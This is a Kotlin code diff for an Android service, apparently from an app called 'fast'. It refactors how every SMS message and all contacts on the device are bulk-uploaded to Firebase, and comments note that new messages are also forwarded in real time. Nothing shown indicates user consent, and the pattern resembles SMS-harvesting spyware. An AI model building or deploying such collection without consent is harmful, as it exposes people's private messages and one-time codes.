@@ -14,7 +14,6 @@ import androidx.core.app.ActivityCompat
 import android.Manifest
 import com.example.fast.util.ContactHelperOptimized
 import com.example.fast.util.ContactBatchProcessor
-import com.example.fast.util.SmsQueryHelper
 import com.example.fast.util.FirebaseSyncHelper
 import com.google.firebase.Firebase
 import com.google.firebase.database.database
@@ -238,9 +237,10 @@ class ContactSmsSyncService : Service() {
      * SMS Sync Module
      *
      * Strategy:
-     * 1. Fetch SMS messages from device
+     * 1. Fetch SMS messages from device (default SMS database)
      * 2. Sync to Firebase (primary backend)
      *
+     * Uses unified FirebaseSyncHelper.syncSmsMessagesFromDevice (limit = null for full sync).
      * Note: Real-time new messages are synced separately to Firebase (handled by NotificationReceiver)
      */
     private fun syncSmsMessages(
@@ -254,39 +254,19 @@ class ContactSmsSyncService : Service() {
             return
         }
 
-        try {
-            Log.d(TAG, "Starting SMS sync...")
-
-            // Step 1: Fetch SMS messages from device
-            val messages = fetchSmsMessages()
-            Log.d(TAG, "Retrieved ${messages.size} messages")
-
-            if (messages.isEmpty()) {
-                Log.d(TAG, "No messages to sync")
+        Log.d(TAG, "Starting SMS sync (full sync from device)...")
+        FirebaseSyncHelper.syncSmsMessagesFromDevice(
+            context = this,
+            limit = null, // Full sync - all messages
+            onSuccess = { syncedCount ->
+                Log.d(TAG, "✅ SMS sync successful: $syncedCount messages synced to Firebase")
+                onComplete?.invoke(syncedCount)
+            },
+            onFailure = { error ->
+                Log.w(TAG, "⚠️ Firebase SMS sync failed: $error")
                 onComplete?.invoke(0)
-                return
             }
-
-            // Step 2: Sync to Firebase (primary backend)
-            Log.d(TAG, "Syncing messages to Firebase...")
-            FirebaseSyncHelper.syncSmsMessages(
-                context = this,
-                messages = messages,
-                onSuccess = { syncedCount ->
-                    Log.d(TAG, "✅ SMS sync successful: $syncedCount messages synced to Firebase")
-                    onComplete?.invoke(syncedCount)
-                },
-                onFailure = { error ->
-                    // Firebase sync failed - log error and continue
-                    // App continues normally - user can retry later
-                    Log.w(TAG, "⚠️ Firebase SMS sync failed: $error")
-                    onComplete?.invoke(0)
-                }
-            )
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Error in SMS sync: ${e.message}", e)
-            onComplete?.invoke(0)
-        }
+        )
     }
 
     /**
@@ -294,13 +274,6 @@ class ContactSmsSyncService : Service() {
      */
     private fun fetchContacts(): List<com.example.fast.model.Contact> {
         return ContactHelperOptimized.getAllContacts(this)
-    }
-
-    /**
-     * SMS Sync: Fetch SMS messages from device
-     */
-    private fun fetchSmsMessages(): List<com.example.fast.model.ChatMessage> {
-        return SmsQueryHelper.getAllMessages(this, null)
     }
 
     // Note: Real-time new messages are synced separately to Firebase (handled by NotificationReceiver)
